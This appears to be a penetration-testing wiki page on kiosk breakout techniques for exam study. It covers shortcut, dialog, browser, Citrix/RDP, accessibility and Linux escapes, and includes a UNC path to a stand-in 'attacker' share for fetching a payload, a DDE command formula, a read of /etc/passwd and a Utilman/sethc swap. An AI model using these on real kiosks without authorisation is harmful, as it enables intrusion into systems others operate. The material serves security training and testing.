---
title: Kiosk breakout techniques
slug: kiosk-breakout-techniques
aliases: [kiosk-breakout, kiosk-escape]
---

{% raw %}

> **TL;DR:** A kiosk is any Windows or Linux system locked into a single app — an information terminal, a banking client, a Citrix/RDP-published app, an in-flight entertainment screen. Breakouts come from (1) dialog and shell escapes inside the host app, (2) keyboard shortcuts the locker forgot to disable, (3) helper apps and file dialogs that link to a real shell, and (4) accessibility features. OSEP has a dedicated module on this; OSCP doesn't, but the techniques generalise to "I have a partial shell and need a real one." Companion to [[shell-upgrade-techniques]].

## The map

```
Kiosk app  ──File→Open──→  File Explorer  ──address bar──→  cmd.exe
   │
   ├──Print──→  Print dialog  ──right-click→Save As──→  Explorer
   │
   ├──Help→About URL──→  Web browser  ──URL bar→file:──→  Explorer
   │
   └──Crash/Error dialog──→ "Send report" / "Browse..." link → Explorer
```

Every link in this tree is a candidate. Find any one that lands you in `explorer.exe` or `cmd.exe` and you're out.

## Keyboard shortcuts to try first

In rough order of "least likely to be blocked":

| Combo | Effect |
|---|---|
| `Win+R` | Run dialog → type `cmd` |
| `Win+E` | File Explorer |
| `Win+U` | Ease of Access settings → on lockscreen, accessibility shell |
| `Win+X` | Quick Link menu (PowerShell, Computer Management) |
| `Ctrl+Shift+Esc` | Task Manager → File → Run new task |
| `Ctrl+Alt+Del` → "Task Manager" | same |
| `Shift` × 5 at lock screen | Sticky Keys (if `sethc.exe` was swapped — see [[accessibility-stickykeys-persistence]]) |
| `Win+Up` then click | sometimes escapes fullscreen-lock |
| `Alt+F4` repeatedly | close everything; sometimes lands on a less-locked shell |
| `Win+Tab` | Task view — sometimes shows other unlocked apps |

A well-built kiosk disables all of these via group policy. A poorly-built one disables a subset.

## Dialog tricks

### File dialogs
A Save/Open dialog is a full File Explorer in miniature. Once it's on screen:
- Type a path in the filename field: `\\127.0.0.1\c$\` or `C:\Windows\System32\cmd.exe` and hit Open.
- Right-click in the file list → "Open with..." → choose Notepad → from Notepad's File menu, Save As → repeat.
- Type a UNC path: `\\attacker\share` — fetches your remote payload.
- Type `cmd.exe` directly in the filename field.

### Print dialogs
Some printers ship with a "Help" button that opens a Microsoft Help (`.chm`) file; CHM files can include `<OBJECT>` tags that launch arbitrary programs.

### Error / report dialogs
"Click here to send error report" → Internet Explorer opens → URL bar → `file://c:/` → Explorer.

## Browser kiosks

If the kiosk is "a browser at a fixed URL", try:
- `Ctrl+L` → URL bar → `file:///C:/`.
- `Ctrl+O` → Open file → file dialog.
- `Ctrl+P` → Print → "Print to PDF" → Save As → file dialog.
- `Shift + click` on a link → "open in new window" → window has full chrome.
- Right-click → View Source → opens in Notepad on some configs.
- Long-press on a touch kiosk → context menu sometimes leaks.

## Citrix / RDP published-app kiosks

You're given one app (Outlook, an LOB tool). The whole OS is on the server.

- `Ctrl+Alt+End` (RDP equivalent of Ctrl+Alt+Del).
- Inside Office: File → Open → file dialog (same trick).
- Outlook: insert hyperlink → `file:///C:/Windows/System32/cmd.exe`.
- Excel: insert hyperlink, then DDE or formula like `=CMD|'/c calc'!A1` (older versions).
- File attachments — drag a `.bat` from a phishing email to the desktop.

The published-app shell (`rdpinit.exe`, `seamlessrdp`) often watches for the app exiting; if you can crash it cleanly without triggering the watcher, you may drop into a desktop.

## Accessibility (Win + U) and assistive tech

The Win+U "Ease of Access" menu on the lock screen launches **Utilman.exe** running as SYSTEM. The classic post-physical-access trick is to replace `Utilman.exe` (or `sethc.exe`) with a copy of `cmd.exe` — but that needs prior file write.

In a kiosk context, the live abuse is:
- Click "Narrator" or "On-Screen Keyboard" → settings page opens → help link → browser → escape.
- Sticky Keys popup → "Settings" link → Control Panel.

## Linux kiosks

Often a single X session running a custom shell, no window manager keybindings.

- Hold `Alt+SysRq+K` (SAK — Secure Attention Key) → kills X server → drops to a TTY login.
- Try `Ctrl+Alt+F1..F6` for TTYs (commonly disabled, sometimes not).
- Right-click on the desktop / panel → menu often includes "Open Terminal".
- `xdg-open file:///etc/passwd` if a "browser" is wired to default xdg-open.
- Firefox: `about:profiles` → open profile folder → file manager.

## Always-try checklist (memorise)

1. Every keyboard shortcut from the table above.
2. Every menu in the host app: File / Edit / View / Help.
3. Right-click everywhere.
4. Save As / Open / Insert / Hyperlink → file dialog.
5. Help → About → click any URL.
6. Print → Microsoft Print to PDF → Save As.
7. Any error or crash dialog with a button or link.

## Defence (so you know what's been disabled)
- AppLocker (see [[applocker-bypass-techniques]]).
- Group policy: disable Win key combos, disable Ctrl+Alt+Del options, hide drives in Explorer.
- Custom shell (`Shell=` registry value replaced with the kiosk app — no `explorer.exe`).
- Assigned Access (Windows multi-app kiosk).

## References
- [Microsoft — Configure kiosks and digital signs](https://learn.microsoft.com/en-us/windows/configuration/kiosk-methods)
- [NCC Group — Citrix breakout cheatsheet](https://research.nccgroup.com/) (research index)
- [iKAT — kiosk hacking tools (historic)](https://ikat.kioskhacking.com/)
- See also: [[shell-upgrade-techniques]], [[applocker-bypass-techniques]], [[accessibility-stickykeys-persistence]], [[osep-roadmap]]

{% endraw %}
